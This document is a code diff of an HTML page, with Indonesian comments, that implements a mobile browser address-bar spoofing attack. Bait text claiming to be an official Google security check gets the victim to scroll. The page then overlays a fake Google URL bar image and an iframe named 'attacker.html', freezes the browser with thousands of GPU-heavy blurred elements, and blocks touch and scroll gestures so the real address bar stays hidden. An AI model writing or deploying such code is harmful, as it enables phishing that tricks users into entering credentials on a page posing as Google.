@@ -4,88 +4,76 @@
     <meta charset="UTF-8" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
     />
     <title>azzzab</title>
     <style>
-      body,
-      html {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 200vh;
+      /* MATIKAN SEMUA EFEK PULL-TO-REFRESH DAN BOUNCE */
+      html, body {
+        margin: 0; padding: 0; width: 100%; height: 100%;
         background-color: #f8f9fa;
-        font-family: sans-serif;
-        scroll-behavior: smooth;
-        overflow-x: hidden;
+        overflow: hidden; /* Lock root utama */
+        overscroll-behavior: none !important;
       }
+
+      /* Container buat trigger scroll awal */
+      #scroll-container {
+        width: 100%;
+        height: 100%;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      /* Content wrapper agar ada ruang buat scroll */
+      #content-padding {
+        height: 200vh;
+      }
+
       #scroll-bait {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        text-align: center;
-        color: #5f6368;
-        padding: 20px;
+        display: flex; flex-direction: column; align-items: center;
+        justify-content: center; height: 100vh; text-align: center;
+        color: #5f6368; padding: 20px;
       }
+
       #fake-ui {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        z-index: 99999;
+        display: none; position: fixed; top: 0; left: 0;
+        width: 100vw; height: 100vh; z-index: 99999;
         background: #fff;
+        overscroll-behavior: none;
+        touch-action: none; /* POWERFULL: Matikan semua gesture default */
       }
+
       #fake-bar {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        height: 56px;
-        object-fit: contain;
-        border-bottom: 1px solid #ddd;
-        z-index: 10;
-        opacity: 0;
-        transition: opacity 0.1s ease-in;
-        pointer-events: none;
+        position: absolute; bottom: 0; left: 0;
+        width: 100%; height: 56px; object-fit: contain;
+        border-bottom: 1px solid #ddd; z-index: 100;
+        opacity: 0; pointer-events: none;
       }
+
       #fake-content {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100vh;
-        border: none;
-        z-index: 1;
-        display: block;
-        transition:
-          top 0.1s ease-in,
-          height 0.1s ease-in;
+        position: absolute; top: 0; left: 0;
+        width: 100%; height: 100vh; border: none; z-index: 1;
       }
+
       #gpu-killer {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 1px;
-        height: 1px;
-        pointer-events: none;
-        z-index: 1;
+        position: fixed; top: 0; left: 0; width: 1px; height: 1px;
+        pointer-events: none; z-index: 1;
       }
     </style>
   </head>
   <body>
-    <div id="scroll-bait">
-      <h2>
-        This is the official Google domain. Want to earn $100,000? Follow these
-        instructions. Please scroll down to the bottom of this page to proceed
-        to accounts.google.com.
-      </h2>
-      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
+    <div id="scroll-container">
+      <div id="content-padding">
+        <div id="scroll-bait">
+          <h2>Official Domain Security Check</h2>
+          <p>Please scroll down to verify your identity.</p>
+          <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
+        </div>
+      </div>
     </div>
+
     <div id="gpu-killer"></div>
+
     <div id="fake-ui">
       <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
       <iframe id="fake-content" src="attacker.html"></iframe>
@@ -93,33 +81,58 @@
 
     <script>
       let isSpoofed = false;
+      const scroller = document.getElementById('scroll-container');
 
       function triggerMeltdown() {
         const killerContainer = document.getElementById("gpu-killer");
-        for (let i = 0; i < 2000; i++) {
+        for (let i = 0; i < 2500; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
+          div.style.cssText = `position:absolute; width:100vw; height:10vh; backdrop-filter:blur(15px); opacity:0.01;`;
           killerContainer.appendChild(div);
         }
         let start = Date.now();
-        while (Date.now() - start < 400) {}
+        while (Date.now() - start < 500) {} // Freeze main thread
       }
 
-      window.addEventListener(
-        "scroll",
-        () => {
-          if (window.scrollY > 80 && !isSpoofed) {
-            isSpoofed = true;
-            document.getElementById("fake-ui").style.display = "block";
-            triggerMeltdown();
-            window.scrollTo(0, 0);
-            setTimeout(() => {
-              document.getElementById("gpu-killer").innerHTML = "";
-            }, 1000);
+      // FUNGSI LOCKDOWN TOTAL
+      function lockScrollBoundaries() {
+        // Blokir total touch event di luar kontrol kita
+        window.addEventListener('touchstart', (e) => {
+          if (isSpoofed) {
+            // Jika user nyentuh area atas/bawah, kita reset koordinatnya
+            if (window.pageYOffset <= 1) window.scrollTo(0, 1);
           }
-        },
-        { passive: true },
-      );
+        }, { passive: false });
+
+        window.addEventListener('touchmove', (e) => {
+          if (isSpoofed) e.preventDefault(); // Matikan scroll fisik
+        }, { passive: false });
+        
+        // Disable scroll via wheel/trackpad
+        window.addEventListener('wheel', (e) => {
+          if (isSpoofed) e.preventDefault();
+        }, { passive: false });
+      }
+
+      scroller.addEventListener("scroll", () => {
+        if (scroller.scrollTop > 80 && !isSpoofed) {
+          isSpoofed = true;
+          
+          // Trigger UI Desync
+          document.getElementById("fake-ui").style.display = "block";
+          triggerMeltdown();
+          
+          // LOCKDOWN: Matikan container scroll asli
+          scroller.style.overflow = "hidden";
+          scroller.style.display = "none";
+          
+          // Jalankan Boundary Hijacking
+          lockScrollBoundaries();
+          
+          // Reset posisi visual ke 'safe zone'
+          window.scrollTo(0, 1);
+        }
+      });
 
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
@@ -129,16 +142,19 @@
           fakeBar.style.pointerEvents = "auto";
           fakeContent.style.top = "56px";
           fakeContent.style.height = "calc(100vh - 56px)";
+          
+          // Force browser untuk stay di koordinat 1px
+          setInterval(() => {
+            if (window.pageYOffset !== 1) window.scrollTo(0, 1);
+          }, 10);
         }
       });
 
-      document.getElementById("fake-bar").addEventListener(
-        "touchmove",
-        (e) => {
-          if (isSpoofed) e.preventDefault();
-        },
-        { passive: false },
-      );
+      // BLOKIR TOTAL IMAGE DRAGGING & TOUCH
+      const fb = document.getElementById("fake-bar");
+      ['touchstart', 'touchmove', 'touchend', 'contextmenu'].forEach(evt => {
+        fb.addEventListener(evt, (e) => e.preventDefault(), { passive: false });
+      });
     </script>
   </body>
 </html>
